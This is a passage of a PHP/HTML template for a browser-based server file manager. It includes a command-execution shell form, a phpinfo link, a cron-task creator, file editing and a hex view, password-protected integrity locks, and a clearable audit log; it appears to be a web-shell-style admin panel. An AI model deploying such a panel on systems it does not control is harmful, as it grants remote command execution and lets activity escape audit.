                    <?php if (trim($entry["out"]) !== ""): ?>
                      <pre class="pl-4 opacity-90 text-emerald-100/80 break-all whitespace-pre-wrap"><?= h($entry["out"]) ?></pre>
                    <?php endif; ?>
                  </div>
                <?php endforeach; ?>
              <?php endif; ?>
              <div id="shellAnchor"></div>
            </div>

            <div class="p-3 bg-black/40 border-t border-emerald-500/20">
              <form method="post" class="flex gap-2" id="shellForm">
                <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                <input type="hidden" name="action" value="shell_exec">
                <div class="flex-1 flex items-center gap-2 bg-black/40 border border-emerald-500/30 rounded-lg px-3 py-1.5 focus-within:border-emerald-400 transition shadow-inner">
                  <span class="text-emerald-500 font-bold">➜</span>
                  <input class="w-full bg-transparent border-none outline-none text-emerald-100 text-xs font-mono placeholder:text-emerald-700/50" 
                         id="shellInput" name="cmd" autofocus autocomplete="off" placeholder="type command... (e.g. ls -la, whoami, cd ..)">
                </div>
                <button class="btn border-emerald-500/30 text-emerald-400 rounded-lg px-4 py-1.5 text-xs font-bold hover:bg-emerald-500/10 active:scale-95 transition">RUN</button>
              </form>
            </div>
          </div>
          <script>
            // Ensure shell scrolls to bottom on load
            (function(){
                const out = document.getElementById('shellOutput');
                if (out) {
                    out.scrollTop = out.scrollHeight;
                    // Also focus input
                    const inp = document.getElementById('shellInput');
                    if (inp) inp.focus();
                }
            })();
          </script>

        <?php elseif ($tab === "diag"): ?>
          <div class="grid grid-cols-1 gap-3">
            <div class="panel2 rounded-xl p-3">
              <div class="text-xs opacity-80 mb-2 glowText">SYSTEM</div>
              <div class="text-[11px] leading-relaxed space-y-1">
                <?php foreach($sys as $k=>$v): ?>
                  <div class="flex justify-between gap-2">
                    <span class="opacity-70"><?=h($k)?></span>
                    <span class="text-green-200 break-all text-right"><?=h((string)$v)?></span>
                  </div>
                <?php endforeach; ?>
              </div>
              <div class="mt-2 text-[11px] opacity-70">Full: <a class="underline hover:text-green-200" href="?phpinfo=1" target="_blank">PHP INFO</a></div>
            </div>

            <div class="panel2 rounded-xl p-3">
              <div class="text-xs opacity-80 mb-2 glowText">TOTALS (ROOT)</div>
              <div class="text-[11px] space-y-1">
                <div class="flex justify-between"><span class="opacity-70">Directories</span><span class="text-green-200"><?=h((string)$totals["dirs"])?></span></div>
                <div class="flex justify-between"><span class="opacity-70">Files</span><span class="text-green-200"><?=h((string)$totals["files"])?></span></div>
                <div class="flex justify-between"><span class="opacity-70">File bytes</span><span class="text-green-200"><?=h(fmt_bytes((int)$totals["bytes"]))?></span></div>
                <?php if ($totals["capped"]): ?>
                  <div class="text-[11px] text-yellow-200/90 mt-1">Scan capped at <?=h((string)$MAX_SCAN_ENTRIES)?> entries (perf guard)</div>
                <?php endif; ?>
              </div>
            </div>

            <div class="panel2 rounded-xl p-3">
              <div class="text-xs opacity-80 mb-2 glowText">DISK</div>
              <div class="text-[11px] space-y-1">
                <div class="flex justify-between"><span class="opacity-70">Total</span><span class="text-green-200"><?=h(fmt_bytes((int)$diskTotal))?></span></div>
                <div class="flex justify-between"><span class="opacity-70">Used</span><span class="text-green-200"><?=h(fmt_bytes((int)$diskUsed))?></span></div>
                <div class="flex justify-between"><span class="opacity-70">Free</span><span class="text-green-200"><?=h(fmt_bytes((int)$diskFree))?></span></div>
              </div>
            </div>
          </div>

        <?php else: /* files tab main panel */ ?>
          <?php if (!$openMeta): ?>
            <div class="panel2 rounded-xl p-4">
              <div class="text-sm font-semibold glowText">NO_FILE_OPEN</div>
              <div class="text-xs opacity-70 mt-1">Open a file from left. Bulk ops: use checkboxes.</div>
            </div>
          <?php else: ?>
            <div class="flex items-start justify-between gap-2 mb-3">
              <div class="truncate">
                <div class="text-sm font-semibold glowText"><?=h($openMeta["name"])?></div>
                <div class="text-xs opacity-60 break-all"><?=h("/".$openMeta["rel"])?></div>
                <div class="mt-1 text-[11px] opacity-70">
                  perm: <?=h(mode_octal((int)$openMeta["mode"]))?> •
                  owner: <?=h(owner_name($openMeta["owner"]))?> •
                  group: <?=h(group_name($openMeta["group"]))?> •
                  <?= $openMeta["r"] ? "R" : "-" ?>/<?= $openMeta["w"] ? "W" : "-" ?>
                </div>
              </div>
              <div class="flex items-center gap-2">
                <a class="btn rounded-lg px-3 py-1.5 text-xs"
                   href="?<?=h(http_build_query(["download"=>$openMeta["rel"]]))?>">DOWNLOAD</a>
                <button class="btn rounded-lg px-3 py-1.5 text-xs"
                        onclick="openRename('<?=h($openMeta["rel"])?>','<?=h($openMeta["name"])?>')">RENAME</button>
                <button class="btnDanger rounded-lg px-3 py-1.5 text-xs"
                        onclick="openTrash('<?=h($openMeta["rel"])?>','<?=h($openMeta["name"])?>')">TRASH</button>
              </div>
            </div>

            <!-- Preview helpers -->
            <?php
              $ext = $openMeta["ext"];
              $isImage = in_array($ext, ["png","jpg","jpeg","webp","gif"], true);
              $isJson = ($ext === "json");
            ?>

            <?php if ($isImage): ?>
              <div class="panel2 rounded-xl p-3 mb-3">
                <div class="text-xs opacity-80 mb-2 glowText">IMAGE_PREVIEW</div>
                <img src="<?=h($openMeta["rel"])?>" class="max-w-full rounded-lg border border-green-500/20" alt="preview">
              </div>
            <?php endif; ?>

            <?php if ($isJson && $openEditable): ?>
              <?php
                $pretty = "";
                $decoded = json_decode($openContent, true);
                if ($decoded !== null) $pretty = json_encode($decoded, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES);
              ?>
              <div class="panel2 rounded-xl p-3 mb-3">
                <div class="text-xs opacity-80 mb-2 glowText">JSON_PRETTY</div>
                <pre class="mono-scroll input rounded-xl p-3 text-[11px] leading-relaxed max-h-[30vh]"><?=h($pretty ?: "Invalid JSON")?></pre>
              </div>
            <?php endif; ?>

            <?php if ($showDiff && isset($_SESSION["last_diff"]) && is_array($_SESSION["last_diff"])): ?>
              <div class="panel2 rounded-xl p-3 mb-3">
                <div class="text-xs opacity-80 mb-2 glowText">LAST_SAVE_DIFF</div>
                <?php if ($diffMode === "diff"): ?>
                  <pre class="mono-scroll input rounded-xl p-3 text-[11px] leading-relaxed max-h-[40vh]"><?=h($diffOut)?></pre>
                <?php else: ?>
                  <div class="text-[11px] opacity-70 mb-2">xdiff not available → side-by-side view</div>
                  <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
                    <div>
                      <div class="text-[11px] opacity-80 mb-1">BEFORE</div>
                      <pre class="mono-scroll input rounded-xl p-3 text-[11px] leading-relaxed max-h-[35vh]"><?=h((string)($_SESSION["last_diff"]["before"] ?? ""))?></pre>
                    </div>
                    <div>
                      <div class="text-[11px] opacity-80 mb-1">AFTER</div>
                      <pre class="mono-scroll input rounded-xl p-3 text-[11px] leading-relaxed max-h-[35vh]"><?=h((string)($_SESSION["last_diff"]["after"] ?? ""))?></pre>
                    </div>
                  </div>
                <?php endif; ?>
              </div>
            <?php endif; ?>

            <?php if ($openEditable): ?>
              <form method="post" class="space-y-2">
                <input type="hidden" name="csrf" value="<?=h($csrf)?>">
                <input type="hidden" name="action" value="save_file">
                <input type="hidden" name="file" value="<?=h($openMeta["rel"])?>">
                <textarea name="content" class="mono-scroll input w-full rounded-xl p-3 text-xs leading-relaxed min-h-[100vh]"
                          spellcheck="false"><?=h($openContent)?></textarea>
                <div class="flex items-center justify-between">
                  <button class="btn rounded-lg w-full px-4 py-2 text-xs">SAVE</button>
                </div>
              </form>
            <?php else: ?>
              <div class="panel2 rounded-xl p-4">
                <div class="text-sm font-semibold glowText">VIEW_ONLY</div>
                <div class="text-xs opacity-70 mt-1">
                  <?php if ($openMeta["size"] > $MAX_EDIT_BYTES): ?>
                    File too large for editor. Use DOWNLOAD.
                  <?php elseif ($openBinary): ?>
                    Binary detected. Use DOWNLOAD. (Hex view below)
                  <?php else: ?>
                    Not editable.
                  <?php endif; ?>
                </div>
                <?php if ($openBinary && $openAbs && is_file($openAbs)): ?>
                  <?php
                    $raw = @file_get_contents($openAbs, false, null, 0, 1024);
                    if (!is_string($raw)) $raw = "";
                    $hex = strtoupper(bin2hex($raw));
                    $lines = [];
                    for ($i=0; $i<strlen($hex); $i+=32) $lines[] = substr($hex, $i, 32);
                  ?>
                  <div class="mt-3">
                    <div class="text-[11px] opacity-80 mb-1 glowText">HEX_DUMP (first 1024 bytes)</div>
                    <pre class="mono-scroll input rounded-xl p-3 text-[11px] leading-relaxed max-h-[40vh]"><?=h(implode("\n",$lines))?></pre>
                  </div>
                <?php endif; ?>
              </div>
            <?php endif; ?>
          <?php endif; ?>
        <?php endif; ?>
      </div>
    </div>

    <!-- Right: Audit -->
    <div class="col-span-12 lg:col-span-3 panel rounded-xl overflow-hidden">
      <div class="px-3 py-2 border-b border-green-500/20 flex items-center gap-2">
        <div class="text-sm font-semibold glowText">AUDIT_LOG</div>
        <div class="ml-auto flex items-center gap-2">
            <form method="post">
                <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                <input type="hidden" name="action" value="clear_audit">
                <button type="button" class="text-[9px] text-red-500/70 hover:text-red-400 font-bold uppercase tracking-tighter transition-colors"
                        onclick="const f=this.form; openConfirm('CLEAR_AUDIT', 'Clear audit log?', ()=>f.submit())">CLEAR</button>
            </form>
            <div class="text-xs opacity-70">session</div>
        </div>
      </div>
      <div class="p-3">
        <div class="mono-scroll max-h-[75vh] overflow-auto text-[11px] leading-relaxed space-y-1">
          <?php if (empty($auditLog)): ?>
            <div class="opacity-70">No events.</div>
          <?php else: ?>
            <?php foreach($auditLog as $line): ?>
              <div class="opacity-85"><?=h((string)$line)?></div>
            <?php endforeach; ?>
          <?php endif; ?>
        </div>
      </div>
    </div>
  </div>

  <!-- Modals -->
  <div id="modalRename" class="fixed inset-0 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-xl w-full max-w-lg p-4">
      <div class="flex items-center justify-between mb-3">
        <div class="text-sm font-semibold glowText">RENAME</div>
        <button class="btn rounded-lg px-2 py-1 text-xs" onclick="closeModals()">X</button>
      </div>
      <form method="post" class="space-y-3">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="from" id="renameFrom" value="">
        <input class="input w-full rounded-lg px-3 py-2 text-xs" id="renameTo" name="to" placeholder="new name">
        <div class="flex justify-end gap-2">
          <button type="button" class="btn rounded-lg px-3 py-2 text-xs" onclick="closeModals()">CANCEL</button>
          <button class="btn rounded-lg px-3 py-2 text-xs">RENAME</button>
        </div>
      </form>
    </div>
  </div>

  <div id="contextMenu">
    <div id="ctxStandard">
      <div id="ctxExtract" class="ctx-item" onclick="ctxExtract()"><?= get_icon('extract', 'w-4 h-4') ?> Extract File</div>
      <div class="ctx-sep"></div>
      <?php $isSelfGuard = is_guard_active(); ?>
      <div id="ctxGuardLock" class="ctx-item" onclick="ctxLock()" style="<?= $isSelfGuard ? 'display:none' : '' ?>">
        <?= get_icon('lock', 'w-4 h-4 text-amber-500') ?> Lock (Self-Guard)
      </div>
      <div id="ctxGuardUnlock" class="ctx-item" onclick="ctxUnlock()" style="<?= $isSelfGuard ? '' : 'display:none' ?>">
        <?= get_icon('unlock', 'w-4 h-4 text-green-500') ?> Unlock (Self-Guard)
      </div>
      <div class="ctx-sep"></div>
      <div id="ctxLock" class="ctx-item" onclick="ctxLockCustom()"><?= get_icon('lock', 'w-4 h-4') ?> Lock</div>
      <div id="ctxUnlock" class="ctx-item" onclick="ctxUnlockCustom()" style="display:none"><?= get_icon('unlock', 'w-4 h-4') ?> Unlock</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item" onclick="ctxRename()"><?= get_icon('rename', 'w-4 h-4') ?> Rename</div>
      <div class="ctx-item" onclick="ctxCopy()"><?= get_icon('copy', 'w-4 h-4') ?> Copy</div>
      <div class="ctx-item" onclick="ctxCut()"><?= get_icon('cut', 'w-4 h-4') ?> Cut</div>
      <div id="ctxPasteItem" class="ctx-item" onclick="ctxPaste()"><?= get_icon('paste', 'w-4 h-4') ?> Paste Here</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item text-red-400 group" onclick="ctxTrash()">
        <span class="opacity-70 group-hover:opacity-100"><?= get_icon('trash', 'w-4 h-4') ?></span> Move to Trash
      </div>
    </div>
    <div id="ctxTrashOps" style="display:none">
      <div class="ctx-item" onclick="ctxRestore()"><?= get_icon('back', 'w-4 h-4') ?> Restore</div>
      <div class="ctx-item text-red-500 font-bold" onclick="ctxDeleteForever()"><?= get_icon('trash', 'w-4 h-4') ?> Delete Forever</div>
    </div>
    <div id="ctxClipboardSep" class="ctx-sep"></div>
    <div id="ctxClearItem" class="ctx-item" onclick="ctxClearClipboard()"><?= get_icon('trash', 'w-4 h-4 opacity-50') ?> Clear Clipboard</div>
  </div>

  <div id="modalCreateFolder" class="fixed inset-0 hidden items-center justify-center p-4 z-[9999]">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-2xl w-full max-w-sm overflow-hidden">
      <form method="post">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="mkdir">
        <div class="px-4 py-3 border-b border-green-500/20 flex items-center justify-between">
          <div class="text-sm font-semibold glowText flex items-center gap-2">
            <?= get_icon('folder', 'w-4 h-4 text-green-400') ?> CREATE_FOLDER
          </div>
          <button type="button" class="btn rounded-lg px-2.5 py-1 text-xs" onclick="closeModals()">X</button>
        </div>
        <div class="p-4 space-y-4">
          <input class="input w-full rounded-xl px-4 py-3 text-sm" name="name" id="folderName" placeholder="folder name..." required autofocus>
          <div class="flex justify-end gap-2">
            <button type="button" class="btn rounded-xl px-4 py-2 text-xs" onclick="closeModals()">CANCEL</button>
            <button type="submit" class="btn rounded-xl px-5 py-2 text-xs font-bold border-green-500/40 bg-green-500/10">CREATE</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <div id="modalCreateFile" class="fixed inset-0 hidden items-center justify-center p-4 z-[9999]">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-2xl w-full max-w-lg overflow-hidden">
      <form method="post">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="touch">
        <div class="px-4 py-3 border-b border-green-500/20 flex items-center justify-between">
          <div class="text-sm font-semibold glowText flex items-center gap-2">
            <?= get_icon('file', 'w-4 h-4 text-green-400') ?> CREATE_FILE
          </div>
          <button type="button" class="btn rounded-lg px-2.5 py-1 text-xs" onclick="closeModals()">X</button>
        </div>
        <div class="p-4 space-y-4">
          <input class="input w-full rounded-xl px-4 py-3 text-sm" name="name" id="fileName" placeholder="filename.txt..." required autofocus>
          <textarea class="input w-full rounded-xl px-4 py-3 text-xs font-mono" name="content" rows="6" placeholder="file content (optional)..."></textarea>
          <div class="flex justify-end gap-2">
            <button type="button" class="btn rounded-xl px-4 py-2 text-xs" onclick="closeModals()">CANCEL</button>
            <button type="submit" class="btn rounded-xl px-5 py-2 text-xs font-bold border-green-500/40 bg-green-500/10">CREATE</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <form id="ctxForm" method="post" style="display:none">
    <input type="hidden" name="csrf" value="<?=h($csrf)?>">
    <input type="hidden" name="action" id="ctxAction">
    <input type="hidden" name="item" id="ctxItem">
    <input type="hidden" name="ziprel" id="ctxZipRel">
    <input type="hidden" name="path" value="<?=h($pathRel)?>">
    <input type="hidden" name="tab" value="<?=h($tab)?>">
  </form>

  <div id="modalUnlockGuard" class="fixed inset-0 hidden items-center justify-center p-4 z-[9999]">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-2xl w-full max-w-sm overflow-hidden text-left">
      <form id="guardUnlockForm" method="post" onsubmit="event.preventDefault(); handleAjaxUpload(this);">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="guard_unlock">
        <div class="px-4 py-3 border-b border-green-500/20 flex items-center justify-between">
          <div class="text-sm font-semibold glowText flex items-center gap-2 text-amber-500">
            <?= get_icon('unlock', 'w-4 h-4') ?> UNLOCK_SYSTEM
          </div>
          <button type="button" class="btn rounded-lg px-2.5 py-1 text-xs" onclick="closeModals()">X</button>
        </div>
        <div class="p-4 space-y-4">
          <div class="text-xs opacity-70">Enter administrator password to disable Self-Guard protection:</div>
          <input type="password" class="input w-full rounded-xl px-4 py-3 text-sm" name="password" id="unlockPass" placeholder="password..." required>
          <div class="flex justify-end gap-2">
            <button type="button" class="btn rounded-xl px-4 py-2 text-xs" onclick="closeModals()">CANCEL</button>
            <button type="submit" class="btnDanger rounded-xl px-5 py-2 text-xs font-bold">UNLOCK</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <div id="modalUnlockSession" class="fixed inset-0 hidden items-center justify-center p-4 z-[9999]">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-2xl w-full max-w-sm overflow-hidden text-left">
      <form id="sessionUnlockForm" method="post" onsubmit="event.preventDefault(); handleAjaxUpload(this);">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="unlock_session">
        <div class="px-4 py-3 border-b border-purple-500/20 flex items-center justify-between">
          <div class="text-sm font-semibold glowText flex items-center gap-2 text-purple-500">
            <?= get_icon('unlock', 'w-4 h-4') ?> DEACTIVATE_GLOBAL_LOCK
          </div>
          <button type="button" class="btn rounded-lg px-2.5 py-1 text-xs" onclick="closeModals()">X</button>
        </div>
        <div class="p-4 space-y-4">
          <div class="text-xs opacity-70">Enter administrator password to deactivate Global Integrity Lock (disable monitoring and rollback):</div>
          <input type="password" class="input w-full rounded-xl px-4 py-3 text-sm" name="password" id="unlockSessionPass" placeholder="password..." required>
          <div class="flex justify-end gap-2">
            <button type="button" class="btn rounded-xl px-4 py-2 text-xs" onclick="closeModals()">CANCEL</button>
            <button type="submit" class="btnDanger rounded-xl px-5 py-2 text-xs font-bold">UNLOCK</button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <div id="modalTrash" class="fixed inset-0 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-xl w-full max-w-lg p-4">
      <div class="flex items-center justify-between mb-2">
        <div class="text-sm font-semibold glowText">MOVE_TO_TRASH</div>
        <button class="btn rounded-lg px-2 py-1 text-xs" onclick="closeModals()">X</button>
      </div>
      <div class="text-xs opacity-80 mb-3" id="trashText">Confirm trash?</div>
      <form method="post" class="flex justify-end gap-2">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="trash_one">
        <input type="hidden" name="target" id="trashTarget" value="">
        <button type="button" class="btn rounded-lg px-3 py-2 text-xs" onclick="closeModals()">CANCEL</button>
        <button class="btnDanger rounded-lg px-3 py-2 text-xs">TRASH</button>
      </form>
    </div>
  </div>

  <div id="modalCron" class="fixed inset-0 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-xl w-full max-w-lg p-4">
      <div class="flex items-center justify-between mb-3">
        <div class="text-sm font-semibold glowText">MANAGE_CRON_TASK</div>
        <button class="btn rounded-lg px-2 py-1 text-xs" onclick="closeModals()">X</button>
      </div>
      <form method="post" class="space-y-3">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="cron_save">
        
        <div>
          <label class="text-[10px] opacity-70 mb-1 block">TASK NAME</label>
          <input class="input w-full rounded-lg px-3 py-2 text-xs" id="cronName" name="name" placeholder="MyTask">
        </div>
        
        <div>
          <label class="text-[10px] opacity-70 mb-1 block">COMMAND</label>
          <input class="input w-full rounded-lg px-3 py-2 text-xs" id="cronCmd" name="command" placeholder="php /path/to/script.php">
        </div>

        <div class="grid grid-cols-2 gap-3">
          <div>
            <label class="text-[10px] opacity-70 mb-1 block">FREQUENCY (Windows)</label>
            <select class="input w-full rounded-lg px-3 py-2 text-xs" name="freq">
              <option value="DAILY">DAILY</option>
              <option value="HOURLY">HOURLY</option>
              <option value="MINUTE">MINUTE</option>
            </select>
          </div>
          <div>
            <label class="text-[10px] opacity-70 mb-1 block">START TIME (HH:MM)</label>
            <input class="input w-full rounded-lg px-3 py-2 text-xs" name="time" value="00:00">
          </div>
        </div>

        <div class="flex justify-end gap-2 pt-2">
          <button type="button" class="btn rounded-lg px-3 py-2 text-xs" onclick="closeModals()">CANCEL</button>
          <button class="btn rounded-lg px-3 py-2 text-xs">SAVE TASK</button>
        </div>
      </form>
    </div>
  </div>

  <div id="modalConfirm" class="fixed inset-0 hidden items-center justify-center p-4 z-[9999]">
    <div class="absolute inset-0 bg-black/80" onclick="closeModals()"></div>
    <div class="relative panel rounded-xl w-full max-w-sm p-4 shadow-2xl border-emerald-500/20">
      <div class="flex items-center justify-between mb-2">
        <div class="text-sm font-semibold glowText text-emerald-400" id="confirmTitle">CONFIRM_ACTION</div>
        <button class="btn rounded-lg px-2 py-1 text-xs" onclick="closeModals()">X</button>
      </div>
      <div class="text-xs opacity-90 mb-6 leading-relaxed" id="confirmText">Are you sure you want to proceed with this action?</div>
      <div class="flex justify-end gap-2">
        <button type="button" class="btn rounded-lg px-4 py-2 text-xs" onclick="closeModals()">CANCEL</button>
        <button type="button" class="btnDanger rounded-lg px-4 py-2 text-xs font-bold uppercase tracking-wider" id="confirmOk">PROCEED</button>
      </div>
    </div>
  </div>

  <div id="modalProcess" class="fixed inset-0 hidden items-center justify-center p-4 z-[9999]">
    <div class="absolute inset-0 bg-black/80"></div>
    <div class="relative panel rounded-xl w-full max-w-sm p-6 shadow-2xl border-emerald-500/20">
      <div class="text-center">
        <div class="text-sm font-semibold glowText text-emerald-400 mb-2" id="processTitle">PROCESSING...</div>
        <div class="text-xs opacity-70 mb-4" id="processText">Please wait, your request is being handled.</div>
        
        <div class="progress-outer mb-3">
          <div class="progress-inner" id="processBar"></div>
        </div>
        
        <div class="flex items-center justify-between mb-4">
          <div class="text-[10px] font-mono opacity-60" id="processPercent">0%</div>
          <div class="text-[10px] font-mono opacity-60" id="processCount"></div>
        </div>

        <button type="button" class="btnDanger rounded-lg px-6 py-2 text-xs font-bold uppercase tracking-widest" onclick="cancelCurrentOperation()">CANCEL</button>
      </div>
    </div>
  </div>

<script>
  window.GUARD_ACTIVE = <?= is_guard_active() ? 'true' : 'false' ?>;

  function closeModals(){
    const modals = ['modalRename','modalTrash','modalThemes','modalCron','modalConfirm','modalProcess','modalCreateFolder','modalCreateFile','modalUnlockGuard','modalUnlockSession'];
    for (const id of modals) {
      const m = document.getElementById(id);
      if (!m) continue;
      m.classList.add('hidden'); m.classList.remove('flex');
    }
  }

  function openCreateFolder() {
    closeModals();
    const m = document.getElementById('modalCreateFolder');
    m.classList.remove('hidden'); m.classList.add('flex');
    setTimeout(() => document.getElementById('folderName').focus(), 50);
  }

  function openCreateFile() {
    closeModals();
    const m = document.getElementById('modalCreateFile');
    m.classList.remove('hidden'); m.classList.add('flex');
    setTimeout(() => document.getElementById('fileName').focus(), 50);
  }

  let currentXHR = null;

  function showProcessModal(title, text) {
    document.getElementById('processTitle').textContent = title;
    document.getElementById('processText').textContent = text;
    document.getElementById('processBar').style.width = '0%';
    document.getElementById('processPercent').textContent = '0%';
    document.getElementById('processCount').textContent = '';
    const m = document.getElementById('modalProcess');
    m.classList.remove('hidden'); m.classList.add('flex');
  }

  function updateProcessModal(percent, text = null) {
    const p = Math.min(100, Math.max(0, percent));
    document.getElementById('processBar').style.width = p + '%';
    document.getElementById('processPercent').textContent = Math.round(p) + '%';
    if (text) document.getElementById('processText').textContent = text;
  }

  function cancelCurrentOperation() {
    if (currentXHR) {
      currentXHR.abort();
      currentXHR = null;
      showToast('Operation cancelled', 'error');
    }
    closeModals();
  }

  function triggerFileUpload() { document.getElementById('fileInput').click(); }
  function triggerFolderUpload() { document.getElementById('folderInput').click(); }

  function handleFileSelection(input) {
    if (input.files.length > 0) {
      handleAjaxUpload(document.getElementById('uploadForm'), input.files);
    }
  }

  function handleAjaxUpload(form, filesOverride = null) {
    const formData = new FormData(form);
    const action = form.querySelector('input[name="action"]')?.value || 'upload';
    
    // Clear any existing 'up[]' and 'paths[]' if we are overriding
    if (filesOverride) {
      formData.delete('up[]');
      formData.delete('paths[]');
      for (let i = 0; i < filesOverride.length; i++) {
        formData.append('up[]', filesOverride[i]);
        // webkitRelativePath contains the folder structure
        formData.append('paths[]', filesOverride[i].webkitRelativePath || filesOverride[i].name);
      }
    }

    currentXHR = new XMLHttpRequest();
    const filesCount = formData.getAll('up[]').length;
    
    showProcessModal(action.toUpperCase(), `Preparing ${filesCount} file(s)...`);
    
    currentXHR.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable) {
        const percent = (e.loaded / e.total) * 100;
        updateProcessModal(percent, `Uploading ${filesCount} item(s)...`);
        document.getElementById('processCount').textContent = `${fmtBytes(e.loaded)} / ${fmtBytes(e.total)}`;
      }
    });
    
    currentXHR.addEventListener('load', () => {
      if (currentXHR.status >= 200 && currentXHR.status < 400) {
        updateProcessModal(100, 'Processing on server...');
        window.location.reload();
      } else {
        if (currentXHR.status !== 0) showToast('Operation failed: ' + currentXHR.status, 'error');
        closeModals();
      }
      currentXHR = null;
    });
    
    currentXHR.addEventListener('error', () => {
      showToast('Network error occurred', 'error');
      closeModals();
      currentXHR = null;
    });

    currentXHR.addEventListener('abort', () => {
      currentXHR = null;
      closeModals();
    });
    
    currentXHR.open('POST', form.getAttribute('action') || window.location.href);
    currentXHR.send(formData);
  }

  function fmtBytes(b) {
    const u = ["B","KB","MB","GB"];
    let i = 0;
    while (b >= 1024 && i < u.length-1) { b /= 1024; i++; }
    return (i===0 ? b : b.toFixed(2)) + ' ' + u[i];
  }
  function openRename(rel,name){
    document.getElementById('renameFrom').value = rel;
    document.getElementById('renameTo').value = name;
    const m = document.getElementById('modalRename');
    m.classList.remove('hidden'); m.classList.add('flex');
    setTimeout(()=>document.getElementById('renameTo').focus(), 30);
  }
  function openTrash(rel,name){
    document.getElementById('trashTarget').value = rel;
    document.getElementById('trashText').textContent = 'Move "'+name+'" to TRASH? (restorable)';
    const m = document.getElementById('modalTrash');
    m.classList.remove('hidden'); m.classList.add('flex');
  }

  let confirmCallback = null;
  function openConfirm(title, text, callback) {
    document.getElementById('confirmTitle').textContent = title;
    document.getElementById('confirmText').textContent = text;
    confirmCallback = callback;
    const m = document.getElementById('modalConfirm');
    m.classList.remove('hidden'); m.classList.add('flex');
  }
  // Initialize confirm listener
  document.addEventListener('DOMContentLoaded', () => {
    const okBtn = document.getElementById('confirmOk');
    if (okBtn) {
        okBtn.onclick = () => {
            if (confirmCallback) confirmCallback();
            closeModals();
        };
    }

    // Intercept Forms for Process Modals
    document.querySelectorAll('form').forEach(f => {
      const actionInput = f.querySelector('input[name="action"]');
      if (!actionInput) return;
      
      const act = actionInput.value;
      const ajaxActions = ['upload', 'extract_upload_zip', 'delete', 'trash_one', 'bulk_trash', 'extract_existing_zip', 'bulk_zip', 'paste', 'bulk_backup', 'bulk_chmod', 'trash_purge', 'trash_restore'];
      
      if (ajaxActions.includes(act)) {
        f.onsubmit = (e) => {
          const fileInputs = f.querySelectorAll('input[type="file"]');
          let hasFiles = false;
          fileInputs.forEach(i => { if(i.files.length > 0) hasFiles = true; });

          // If it's an upload action but no files, or it's another action, handle via AJAX
          if ((act.includes('upload') && hasFiles) || !act.includes('upload')) {
            e.preventDefault();
            handleAjaxUpload(f);
          }
        };
      }
    });

  });

  function toggleAll(master){
    document.querySelectorAll('input[type="checkbox"][name="sel[]"]').forEach(cb=>cb.checked = master.checked);
    updateBulkBar();
  }

  function updateBulkBar() {
    const checked = document.querySelectorAll('input[type="checkbox"][name="sel[]"]:checked').length;
    const bar = document.getElementById('bulkBar');
    if(bar) {
        if(checked > 0) {
            bar.classList.remove('hidden');
            document.getElementById('bulkCount').textContent = checked + (checked > 1 ? ' items' : ' item') + ' selected';
        } else {
            bar.classList.add('hidden');
        }
    }
  }

  document.addEventListener('change', (e) => {
      if(e.target && e.target.name === 'sel[]') {
          updateBulkBar();
      }
  });

  function submitBulk(action) {
      const checked = document.querySelectorAll('input[type="checkbox"][name="sel[]"]:checked').length;
      if (checked === 0) return;
      
      const actNames = {
          'bulk_trash': 'move to Trash',
          'bulk_backup': 'Backup',
          'bulk_zip': 'Zip',
          'bulk_chmod': 'Chmod (0644/0755)'
      };
      
      openConfirm('BULK ACTION', `Are you sure you want to ${actNames[action] || action} ${checked} item(s)?`, () => {
          document.getElementById('bulkAction').value = action;
          handleAjaxUpload(document.getElementById('selWrap'));
      });
  }

  let autoTimer = null;
  function enableAuto(){
    const ms = parseInt(document.getElementById('autoref')?.value || "0", 10);
    if (!ms || ms < 500) return;
    disableAuto();
    autoTimer = setInterval(()=>{ window.location.reload(); }, ms);
  }
  function disableAuto(){
    if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
  }
    function openThemes(){
    const m = document.getElementById('modalThemes');
    m.classList.remove('hidden'); m.classList.add('flex');
  }
  function closeThemes(){
    const m = document.getElementById('modalThemes');
    m.classList.add('hidden'); m.classList.remove('flex');
  }

  window.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') closeModals(); });

  // Context Menu Logic
  let currentCtxRel = "";
  let currentCtxName = "";
  
  document.addEventListener('contextmenu', (e) => {
    const row = e.target.closest('.ctx-row');
    if (row) {
      e.preventDefault();
      currentCtxRel = row.getAttribute('data-rel');
      currentCtxName = row.getAttribute('data-name');
      
      const menu = document.getElementById('contextMenu');
      menu.style.display = 'block';
      
      // Position menu
      let x = e.pageX;
      let y = e.pageY;
      
      // Prevent overflow
      if (x + 160 > window.innerWidth) x -= 160;
      if (y + 160 > window.innerHeight) y -= 160;
      
